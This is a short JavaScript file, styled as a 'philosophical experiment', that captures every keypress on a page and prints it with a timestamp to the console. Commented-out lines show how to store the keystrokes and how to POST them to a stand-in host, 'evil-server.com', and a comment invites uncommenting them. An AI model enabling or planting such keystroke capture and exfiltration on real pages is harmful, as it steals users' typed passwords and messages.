// not_a_keylogger.js
// A philosophical experiment: a keylogger that doesn't log.
// Inspect, learn, question. What makes code "evil"?

document.addEventListener('keydown', function(event) {
    // Capture the key pressed
    let key = event.key;
    let timestamp = new Date().toISOString();
    let logEntry = `${timestamp}: ${key}`;

    // This *could* store the keystroke... but it doesn't!
    // Try uncommenting the line below to see what happens.
    // localStorage.setItem('keylog', logEntry);

    // Or maybe it could send it somewhere... but nope!
    // fetch('http://evil-server.com/log', { method: 'POST', body: logEntry });

    // Instead, we just console.log it for you to see.
    console.log('Key pressed:', logEntry);

    // What's missing? Why are you here? Think about it.
});

// Nothing to see here. Or is there? 😈